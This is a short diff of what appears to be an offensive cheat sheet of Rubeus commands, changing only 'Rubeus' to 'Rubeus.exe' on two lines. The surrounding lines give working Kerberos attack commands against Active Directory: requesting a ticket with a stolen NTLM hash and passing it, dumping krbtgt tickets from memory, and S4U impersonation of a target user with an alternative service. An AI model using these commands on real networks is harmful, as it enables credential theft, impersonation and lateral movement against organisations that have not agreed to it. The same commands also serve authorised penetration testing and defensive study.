@@ -13,10 +13,10 @@ Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<ntlmHash> /ptt
 Rubeus.exe renew /ticket:<pathToKirbiFile>
 
 # dump tickets inside memory
-Rubeus dump /service:krbtgt
+Rubeus.exe dump /service:krbtgt
 
 # impersonate user (use cifs as alternative service for http) (further request will need to use the fqdn)
-Rubeus s4u /impersonateuser:<targetUser> /msdsspn:http/<fqdnRhost> /ticket:<base64> /altservice:cifs
+Rubeus.exe s4u /impersonateuser:<targetUser> /msdsspn:http/<fqdnRhost> /ticket:<base64> /altservice:cifs
 
 # purge all kerberos tickets from the current logon session
 Rubeus.exe purge
